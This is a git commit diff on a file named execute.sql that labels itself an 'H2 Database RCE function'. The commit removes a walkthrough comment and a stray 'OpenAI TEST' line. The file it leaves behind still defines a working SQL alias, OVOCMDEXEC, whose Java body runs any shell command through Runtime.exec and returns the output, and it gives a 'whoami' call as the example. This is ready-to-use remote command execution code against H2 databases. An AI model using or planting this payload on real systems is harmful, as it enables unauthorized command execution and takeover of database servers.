dbba1f8ebc3bed46e5bc8defe3456ad9c3f64c63
Aravazhi Rajendran <20073239+aravazhimdr@users.noreply.github.com>
2024-04-27 00:14:12 +0530

    revert: test

--- execute.sql
+++ execute.sql
@@ -2,13 +2,5 @@
 H2 Database RCE function 
 CALL OVOCMDEXEC('whoami')
 other functions are allowed as input as long as they return string.
-    CREATE ALIAS OVOCMDEXEC AS $$ ... $$;: This SQL statement creates an alias named OVOCMDEXEC. An alias is like a shortcut or a nickname for a function or a command in SQL.
-
-    String shellexec(String cmd) throws java.io.IOException { ... }: This part defines a Java method named shellexec. This method takes a string parameter cmd, which represents the shell command to be executed. It throws an IOException, which is a standard Java exception indicating a problem with IO operations, such as file or stream handling.
-
-    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");: This line creates a new Scanner object in Java. It executes the shell command specified by cmd using Runtime.getRuntime().exec(cmd), which returns a Process object representing the running process. From this process, it retrieves the input stream (getInputStream()) and passes it to the Scanner constructor. The useDelimiter("\\A") method sets the delimiter to "\A", which represents the beginning of the input, effectively reading the entire output of the command.
-
-    return s.hasNext() ? s.next() : "";: This line checks if there is any output from the command (s.hasNext()). If there is, it returns the output (s.next()). Otherwise, it returns an empty string "".
-OpenAI TEST
 */
 CREATE ALIAS OVOCMDEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A"); return s.hasNext() ? s.next() : "";  }$$;
